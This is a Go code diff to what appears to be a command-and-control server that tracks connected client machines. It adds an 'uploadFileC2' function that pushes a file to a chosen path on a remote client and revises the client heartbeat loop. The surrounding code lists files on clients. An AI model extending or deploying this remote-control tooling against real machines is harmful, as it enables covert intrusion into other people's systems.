@@ -4,7 +4,9 @@ import (
 	"encoding/gob"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
+	"mime/multipart"
 	"net"
 	"os"
 	"time"
@@ -119,6 +121,30 @@ func handleConn(conn net.Conn) {
 	go Heartbeat(ID)
 }
 
+func uploadFileC2(client Client, file multipart.FileHeader, whereToStore string) (Response, error) {
+	openedFile, err := file.Open()
+	if err != nil {
+		log.Println(err)
+	}
+	byteArray, err := io.ReadAll(openedFile)
+	if err != nil {
+		log.Println(err)
+	}
+	inst := Instructions{
+		IsUpload:     true,
+		FileName:     file.Filename,
+		FileContents: byteArray,
+		Path:         whereToStore,
+	}
+	client.Instruct(inst)
+	message, err := ServerMessageReceiver(client.Conn)
+	if err != nil {
+		log.Println(err)
+		return message, err
+	}
+	return message, nil
+}
+
 func requestFiles(client Client, path string) (Response, error) {
 	inst := Instructions{
 		IsListFiles: true,
@@ -160,16 +186,18 @@ func Heartbeat(ID int) {
 		}
 		client.Instruct(inst)
 		resp, err := ServerMessageReceiver(client.Conn)
-		if err == nil && resp.Message == "PONG" {
-			if client.IsOnline != true {
-				client.IsOnline = true
-			}
-		} else {
+		if err != nil {
 			log.Printf("Client %v is offline :(\n", client.ClientBasicInfo.Hostname)
 			client.IsOnline = false
 			return
 		}
-
+		if resp.Message != "PONG" {
+			continue
+		} else {
+			if client.IsOnline != true {
+				client.IsOnline = true
+			}
+		}
 		time.Sleep(time.Second * heartbeatRate)
 	}
 }
